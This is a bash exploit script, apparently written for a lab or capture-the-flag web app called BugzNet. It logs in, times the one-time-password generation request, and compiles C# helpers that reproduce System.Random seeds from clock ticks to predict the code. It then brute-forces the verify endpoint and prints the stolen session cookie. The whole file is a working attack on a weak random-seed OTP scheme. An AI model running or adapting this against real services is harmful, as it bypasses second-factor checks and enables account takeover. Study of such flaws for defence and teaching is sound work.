#!/bin/bash

if [[ $# -eq 0 ]]
then
        echo "USAGE: $0 <username> <password>"
        exit 1
fi

rhost="http://localhost"
username=$1
password=$2
cookieJar=`mktemp`

ticks="using System;
namespace ticks
{
        internal class Program
        {
                static void Main(string[] args)
                {
                        Console.WriteLine((int)(DateTime.UtcNow.Ticks/10000&int.MaxValue));
                }
        }
}"
echo $ticks > ticks.cs
mcs -out:ticks.exe ticks.cs
csharp="using System;
namespace otp
{
        internal class Program
        {
                static void Main(string[] args)
                {
                        int start = int.Parse(args[0]);
                        int end = int.Parse(args[1]);

                        for (var t = start; t < end; t++)
                        {
                                var rng = new Random(t);
                                var otp = rng.Next(1000000).ToString().PadLeft(6, '0');
                                Console.WriteLine(otp);
                        }
                }
        }
}"
echo $csharp > otp.cs
mcs -out:otp.exe otp.cs

xsrf_token=$(curl -c $cookieJar -s "$rhost/Identity/Login" | htmlq 'input[name=xsrf_token]' -a value)

curl -b $cookieJar -c $cookieJar "$rhost/Identity/Login?handler=Login" \
        --data-urlencode "Data.Email=$username" \
        --data-urlencode "Data.Password=$password" \
        --data-urlencode "xsrf_token=$xsrf_token"

xsrf_token=$(curl -s -b $cookieJar -c $cookieJar "$rhost/MyAccount/Verify" | htmlq 'input[name=xsrf_token]' -a value)

start=`mono ticks.exe`
xsrf_token=$(curl -s -b $cookieJar "$rhost/MyAccount/Verify?handler=Generate" --data-urlencode "xsrf_token=$xsrf_token" | htmlq 'input[name=xsrf_token]' -a value)
end=`mono ticks.exe`

verify_otp() {
        echo "Trying $1"
        curl -s -i -b $cookieJar -c $cookieJar "$rhost/MyAccount/Verify?handler=Verify" \
                --data-urlencode "Data.OTP=$1" \
                --data-urlencode "xsrf_token=$xsrf_token" | grep -q 'Location: /Bugs' \
                        && echo "CookieJar: $cookieJar" \
                        && cat $cookieJar | grep BugzNet-Session \
                        && exit 0
        sleep 1
}

mono otp.exe $start $end | while read otp; do verify_otp $otp; done
